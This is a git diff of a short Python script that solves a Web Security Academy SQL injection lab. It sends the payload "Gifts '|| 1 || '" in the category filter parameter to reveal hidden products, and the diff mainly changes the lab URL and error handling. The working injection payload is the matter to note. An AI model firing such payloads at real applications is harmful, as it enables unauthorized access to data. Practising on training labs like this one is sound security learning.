@@ -12,33 +12,33 @@
 #
 #########################################################################################
 
+
 ###########
 # imports
 ###########
 import requests
 from colorama import Fore
 
+
 #########
 # Main
 #########
+
 # change this to your lab URL
-url = "https://0a4d00a9038b8e3c8423a098007a004b.web-security-academy.net"
+url = "https://0aef00f5036c78c7a7a51d88007a003a.web-security-academy.net"
 
 print(Fore.BLUE + "❯ Injection parameter: " + Fore.YELLOW + "category")
 
 # payload to retrieve unreleased products
 payload = f"Gifts '|| 1 || '"
 
-try:  # inject payload in category parameter
+try:  
+    # inject payload in category parameter
     injection = requests.get(f"{url}/filter?category={payload}")
     
-    # if the response is OK and unreleased products is retrieved
-    if injection.status_code == 200:
-        print(
-            Fore.WHITE + "❯ Injecting payload to retrieve unreleased products.. " + Fore.GREEN + "OK")
-    
-        print(
-            Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")
 except:
-    print(
-        Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
+    print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
+    exit(1)
+
+print(Fore.WHITE + "❯ Injecting payload to retrieve unreleased products.. " + Fore.GREEN + "OK")
+print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")
